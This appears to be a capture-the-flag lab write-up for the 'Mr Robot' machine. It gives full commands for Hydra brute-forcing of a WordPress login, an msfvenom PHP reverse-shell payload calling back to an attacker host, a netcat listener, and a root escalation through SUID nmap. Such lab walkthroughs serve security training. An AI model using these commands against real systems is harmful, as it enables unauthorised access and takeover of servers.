# Enumeration

We begin with an autorecon scan, which quickly identifies ports 80 and 443 as being open. We run the usual follow-up scan with nmap to verify this. 
 
![f44abe2189a06cde038722087593642a.png](/Mr%20Robot%20CTF/_resources/f44abe2189a06cde038722087593642a-1.png)

![617b4242634ecdea43934f95e3484621.png](/Mr%20Robot%20CTF/_resources/617b4242634ecdea43934f95e3484621-1.png)
 
Let's take a look at the output given by the autorecon scan. Examining the `robots.txt` file reveals some information.
 
![cd64d02e2fae9273b64a045a4d22dcec.png](/Mr%20Robot%20CTF/_resources/cd64d02e2fae9273b64a045a4d22dcec-1.png)
 
Navigating to `http://10.10.89.74/key-1-of-3.txt` gives us the first key. The `robots.txt` also points us a wordlist at `http://10.10.89.74/fsocity.dic`, which we download.

From the feroxbuster output generated by Autorecon, we see an interesting directory.
 
![1e0e3dc41916e231c246961ce4308792.png](/Mr%20Robot%20CTF/_resources/1e0e3dc41916e231c246961ce4308792-1.png)

![bfa45c96aca8dd0b74774d530687f310.png](/Mr%20Robot%20CTF/_resources/bfa45c96aca8dd0b74774d530687f310-1.png)
 
Getting the body of the POST request of the login form using BurpSuite, we can try Hydra to brute force the login.

```bash
hydra -l <username guess> -P <path to wordlist> 10.10.89.74 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:<error message for unsuccessful login>" -V
```

In this case, we want to use the wordlist `fsocity.dic` we found earlier. But first we need a username. Note that if we type in some test credentials, we get an error message which tells us the username is invalid.
 
![7fe06c5fd2a9bd063149467517c2f6ee.png](/Mr%20Robot%20CTF/_resources/7fe06c5fd2a9bd063149467517c2f6ee-1.png)
 
We can make use of this to try and find a valid username from our dictionary.

```bash
hydra -L fsocity.dic -p test 10.10.89.74 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -v 
```
 
![1b6adf98c66f0597934f8339991c41d4.png](/Mr%20Robot%20CTF/_resources/1b6adf98c66f0597934f8339991c41d4-1.png)
 
Thus we obtain the username `Elliot` (which maybe you could have gussed, given the theme of the box). If we attempt to login using this username, this verifies that `Elliot` is indeed a valid username. This also gives us another error message we can use with Hydra.
 
![e3699d755773c51a71ebe00815b2501b.png](/Mr%20Robot%20CTF/_resources/e3699d755773c51a71ebe00815b2501b-1.png)
 
Now we can attempt to run Hydra. We can either wait a very long time for Hydra to find the correct password, or we can cleanup the wordlist we found first. Using ``sort fsocity.dic | tee sorted.txt`` will list the words alphabetically. Then, ``uniq sorted.txt | tee trimmedlist.txt`` will remove any duplicate instances. Using `wc -l <file name>`, we can verify that this substantially reduced the size of our wordlist.
 
![62478eaa7c5fdf79cbfe3f12320b8a65.png](/Mr%20Robot%20CTF/_resources/62478eaa7c5fdf79cbfe3f12320b8a65-1.png)
 
Now we run Hydra again with the trimmed wordlist to find our password. 

```bash
hydra -l Elliot -P trimmedlist.txt 10.10.89.74 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered" -v -t 32
```

The `-t` switch specifies the number of tasks to run in parallel. The default is 16; I upped it since the attack was taking a long time. After almost 40 minutes, Hydra found the correct password.
 
![8f3edd3b1f9112d5b5302d2cab935b26.png](/Mr%20Robot%20CTF/_resources/8f3edd3b1f9112d5b5302d2cab935b26-1.png)
 
Alternatively, [wpscan](https://github.com/wpscanteam/wpscan) can be leveraged here since we know the blog is running on WordPress. We can use `wpscan --url http://10.10.89.74/wp-login.php -U Elliot -P <path to password list>` in an attempt to brute force the login. This was taking too long for me, so I just waited for Hydra to finish.

<br>

# Exploitation

Using the credentials we found, we log in and are presented with Elliot's WordPress dashboard. After looking around, we see that we have access to a theme editor.
 
![b012d5df19bf44bae95653fc177520dc.png](/Mr%20Robot%20CTF/_resources/b012d5df19bf44bae95653fc177520dc-1.png)

![adb31d6238f4c3cc826c5740b82fdf54.png](/Mr%20Robot%20CTF/_resources/adb31d6238f4c3cc826c5740b82fdf54-1.png)
 
We will edit the 404 Template; our goal is to upload a reverse shell using this editor in order to get command execution of the underlying machine. Set up a netcat lister with `rlwrap nc -lvnp 9999`. (`rlwrap` is used to get a slightly better shell.) At this point, we can generate a php reverse shell payload using msfvenom: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.6.30.43 LPORT=9999 -f raw -o payload.php`. We would then set up our handler with Metasploit with `exploit/multi/handler`
and with payload `php/meterpreter/reverse_tcp`.

Alternatively, we can use [Pentestmonkey's php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). This is what we'll do. Make the appropriate changes to the script, update the 404 Template file, and navigate to `10.10.89.74/404.php`. We see that this gives a reverse shell, and so we have an initial foothold.
 
![9c52f3524f4ec6a5d6cf6c6ee75dea9e.png](/Mr%20Robot%20CTF/_resources/9c52f3524f4ec6a5d6cf6c6ee75dea9e-1.png)
 
<br>

# Post-exploitation

Digging around, we eventually find an interesting file. Unfortunately, we don't have access to it.
 
![1844ee5fae87970bb5e3a756ee69b538.png](/Mr%20Robot%20CTF/_resources/1844ee5fae87970bb5e3a756ee69b538-1.png)
 
We do, however, have access to a hash file. Cracking the hash reveals the password `abcdefghijklmnopqrstuvwxyz`.
 
![6cfb407e22dcf91f5146869db5f8796c.png](/Mr%20Robot%20CTF/_resources/6cfb407e22dcf91f5146869db5f8796c-1.png)
 
But, if we try to switch to the robot user with `su robot`, we encounter an error.
 
![6dbce00075572adfacbb6e05e9a13ec9.png](/Mr%20Robot%20CTF/_resources/6dbce00075572adfacbb6e05e9a13ec9-1.png)
 
So, let's upgrade our shell using `python -c 'import pty; pty.spawn("/bin/bash")'
`. Doing this allows us to switch users using the password we found above. We can then `cat` the second key.
 
![9048b29fef3190be8463b1662fadc3da.png](/Mr%20Robot%20CTF/_resources/9048b29fef3190be8463b1662fadc3da-1.png)
 
Now let's root the machine. We can escalate our privileges by looking for SUID files with `find / -perm -u=s -type f 2>/dev/null`; we find a few.
 
![3ef1260af740e2b526300c3198f7ec23.png](/Mr%20Robot%20CTF/_resources/3ef1260af740e2b526300c3198f7ec23-1.png)
 
Nmap sticks out, so we check [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) and we see if nmap has the SUID bit set, we can use it to get a root shell. We run nmap in interactive mode with ``nmap --interactive`` and we spawn a root shell with ``!sh``.
 
![ec010bd95a1b1fc80a0a664f575cafaa.png](/Mr%20Robot%20CTF/_resources/ec010bd95a1b1fc80a0a664f575cafaa-1.png)
 
Navigating to `/root`, we find the final flag.
 
![a419f7d063b1538bfc082a6ceea43a98.png](/Mr%20Robot%20CTF/_resources/a419f7d063b1538bfc082a6ceea43a98-1.png)
